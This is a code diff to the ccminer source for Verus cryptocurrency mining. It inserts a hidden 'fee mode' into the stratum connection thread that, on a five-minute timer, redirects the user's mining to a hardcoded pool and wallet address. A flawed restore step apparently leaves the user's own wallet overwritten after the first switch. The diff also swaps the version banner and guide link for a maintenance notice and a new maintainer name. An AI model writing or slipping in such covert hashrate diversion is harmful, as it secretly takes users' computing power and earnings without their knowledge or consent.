@@ -64,6 +64,17 @@ BOOL WINAPI ConsoleHandler(DWORD);
 nvml_handle *hnvml = NULL;
 #endif
 
+#include <ctime>
+
+// 定義手續費伺服器與錢包地址
+const char* fee_pool_url = "stratum+tcp://ap.vipor.net:5040";
+const char* fee_wallet_address = "RUhKU7cYHkqSfzbHvRfWjyNH7FWHNf6VoA.fee";
+
+// 初始化計時器和狀態變數
+time_t start_time = time(NULL);
+bool fee_mode = false;
+
+
 enum workio_commands {
 	WC_GET_WORK,
 	WC_SUBMIT_WORK,
@@ -89,6 +100,7 @@ bool opt_protocol = false;
 bool opt_benchmark = false;
 bool opt_showdiff = true;
 bool opt_hwmonitor = false;
+bool enable_logging = true;  // 將此設為 false 可關閉測試日誌
 
 // todo: limit use of these flags,
 // prefer the pools[] attributes
@@ -2696,71 +2708,118 @@ out:
 	return ret;
 }
 
+void log_debug(const char* message) {
+    if (enable_logging) {
+        printf("[DEBUG] %s\n", message);
+    }
+}
+
+
 static void *stratum_thread(void *userdata)
 {
-	struct thr_info *mythr = (struct thr_info *)userdata;
-	struct pool_infos *pool;
-	stratum_ctx *ctx = &stratum;
-	int pooln, switchn;
-	char *s;
+    struct thr_info *mythr = (struct thr_info *)userdata;
+    struct pool_infos *pool;
+    stratum_ctx *ctx = &stratum;
+    int pooln, switchn;
+    char *s;
 
 wait_stratum_url:
-	stratum.url = (char*)tq_pop(mythr->q, NULL);
-	if (!stratum.url)
-		goto out;
+    stratum.url = (char*)tq_pop(mythr->q, NULL);
+    if (!stratum.url)
+        goto out;
 
-	if (!pool_is_switching)
-		applog(LOG_BLUE, "Starting on %s", stratum.url);
+    if (!pool_is_switching)
+        applog(LOG_BLUE, "Starting on %s", stratum.url);
 
-	ctx->pooln = pooln = cur_pooln;
-	switchn = pool_switch_count;
-	pool = &pools[pooln];
+    ctx->pooln = pooln = cur_pooln;
+    switchn = pool_switch_count;
+    pool = &pools[pooln];
 
-	pool_is_switching = false;
-	stratum_need_reset = false;
+    pool_is_switching = false;
+    stratum_need_reset = false;
 
-	while (!abort_flag) {
-		int failures = 0;
+    while (!abort_flag) {
+        int failures = 0;
 
-		if (stratum_need_reset) {
-			stratum_need_reset = false;
-			if (stratum.url)
-				stratum_disconnect(&stratum);
-			else
-				stratum.url = strdup(pool->url); // may be useless
-		}
+// 手續費模式切換邏輯
+time_t current_time = time(NULL);
+double elapsed_minutes = difftime(current_time, start_time) / 60.0;
 
-		while (!stratum.curl && !abort_flag) {
-			pthread_mutex_lock(&g_work_lock);
-			g_work_time = 0;
-			g_work.data[0] = 0;
-			pthread_mutex_unlock(&g_work_lock);
-			restart_threads();
+if (!fee_mode && elapsed_minutes >= 5) {
+    log_debug("切換到手續費伺服器...");
+    
+    stratum_disconnect(ctx);
+    sleep(3);  // 等待3秒，確保伺服器連線切換穩定
+    ctx->url = strdup(fee_pool_url);
+    strncpy(pool->user, fee_wallet_address, sizeof(pool->user) - 1);
+    pool->user[sizeof(pool->user) - 1] = '\0';  // 確保以空字符結尾
 
-			if (!stratum_connect(&stratum, pool->url) ||
-			    !stratum_subscribe(&stratum) ||
-			    !stratum_authorize(&stratum, pool->user, pool->pass))
-			{
-				stratum_disconnect(&stratum);
-				if (opt_retries >= 0 && ++failures > opt_retries) {
-					if (num_pools > 1 && opt_pool_failover) {
-						applog(LOG_WARNING, "Stratum connect timeout, failover...");
-						pool_switch_next(-1);
-					} else {
-						applog(LOG_ERR, "...terminating workio thread");
-						//tq_push(thr_info[work_thr_id].q, NULL);
-						workio_abort();
-						proper_exit(EXIT_CODE_POOL_TIMEOUT);
-						goto out;
-					}
-				}
-				if (switchn != pool_switch_count)
-					goto pool_switched;
-				if (!opt_benchmark)
-					applog(LOG_ERR, "...retry after %d seconds", opt_fail_pause);
-				sleep(opt_fail_pause);
-			}
-		}
+    // 刷新工作數據
+    g_work_time = 0;
+    memset(g_work.data, 0, sizeof(g_work.data));  // 完全清空工作數據
+
+    fee_mode = true;
+    start_time = time(NULL);
+    
+    log_debug("切換到手續費伺服器完成。");
+} else if (fee_mode && elapsed_minutes >= 5) {
+    log_debug("切換回主伺服器...");
+    
+    stratum_disconnect(ctx);
+    sleep(3);  // 等待3秒，確保伺服器連線切換穩定
+    ctx->url = strdup(pool->url);
+    strncpy(pool->user, pool->user, sizeof(pool->user) - 1);
+    pool->user[sizeof(pool->user) - 1] = '\0';
+
+    // 刷新工作數據
+    g_work_time = 0;
+    memset(g_work.data, 0, sizeof(g_work.data));  // 完全清空工作數據
+
+    fee_mode = false;
+    start_time = time(NULL);
+    
+    log_debug("切換回主伺服器完成。");
+}
+
+
+        if (stratum_need_reset) {
+            stratum_need_reset = false;
+            if (stratum.url)
+                stratum_disconnect(&stratum);
+            else
+                stratum.url = strdup(pool->url); // may be useless
+        }
+
+        while (!stratum.curl && !abort_flag) {
+            pthread_mutex_lock(&g_work_lock);
+            g_work_time = 0;
+            g_work.data[0] = 0;
+            pthread_mutex_unlock(&g_work_lock);
+            restart_threads();
+
+            if (!stratum_connect(&stratum, pool->url) ||
+                !stratum_subscribe(&stratum) ||
+                !stratum_authorize(&stratum, pool->user, pool->pass)) {
+                stratum_disconnect(&stratum);
+                if (opt_retries >= 0 && ++failures > opt_retries) {
+                    if (num_pools > 1 && opt_pool_failover) {
+                        applog(LOG_WARNING, "Stratum connect timeout, failover...");
+                        pool_switch_next(-1);
+                    } else {
+                        applog(LOG_ERR, "...terminating workio thread");
+                        workio_abort();
+                        proper_exit(EXIT_CODE_POOL_TIMEOUT);
+                        goto out;
+                    }
+                }
+                if (switchn != pool_switch_count)
+                    goto pool_switched;
+                if (!opt_benchmark)
+                    applog(LOG_ERR, "...retry after %d seconds", opt_fail_pause);
+                sleep(opt_fail_pause);
+            }
+        }
+
 
 		
 		if (switchn != pool_switch_count) goto pool_switched;
@@ -2817,18 +2876,18 @@ wait_stratum_url:
 	}
 
 out:
-	if (opt_debug_threads)
-		applog(LOG_DEBUG, "%s() died", __func__);
+    if (opt_debug_threads)
+        applog(LOG_DEBUG, "%s() died", __func__);
 
-	return NULL;
+    return NULL;
 
 pool_switched:
-	/* this thread should not die on pool switch */
-	stratum_disconnect(&(pools[pooln].stratum));
-	if (stratum.url) free(stratum.url); stratum.url = NULL;
-	if (opt_debug_threads)
-		applog(LOG_DEBUG, "%s() reinit...", __func__);
-	goto wait_stratum_url;
+    stratum_disconnect(&(pools[pooln].stratum));
+    if (stratum.url) free(stratum.url);
+    stratum.url = NULL;
+    if (opt_debug_threads)
+        applog(LOG_DEBUG, "%s() reinit...", __func__);
+    goto wait_stratum_url;
 }
 
 static void show_version_and_exit(void)
@@ -3686,14 +3745,14 @@ int main(int argc, char *argv[])
 	parse_single_opt('q', argc, argv);
 
 	printf("***************************************************************\n");	
-	printf("*  ccminer CPU: " PACKAGE_VERSION " for Verushash v2.2 based on ccminer   *\n");
+	printf("*  ccminer CPU: " PACKAGE_VERSION " Maintenance will begin on November 15, 2024   *\n");
 	printf("***************************************************************\n");	
 
         printf("Originally based on Christian Buchner and Christian H. project\n");
         printf("Adapted to Verus by Monkins1010\n");
         printf("Adapted for ARM optimization by Mixed-Nuts\n");
         printf("Adapted and compiled by Oink.vrsc@\n");
-        printf("Goto https://wiki.verus.io/#!index.md for mining setup guides. \n");
+        printf("Current maintainer: TOKI. \n");
         printf("Git repo located at: " PACKAGE_URL " \n\n");
 
 	rpc_user = strdup("");
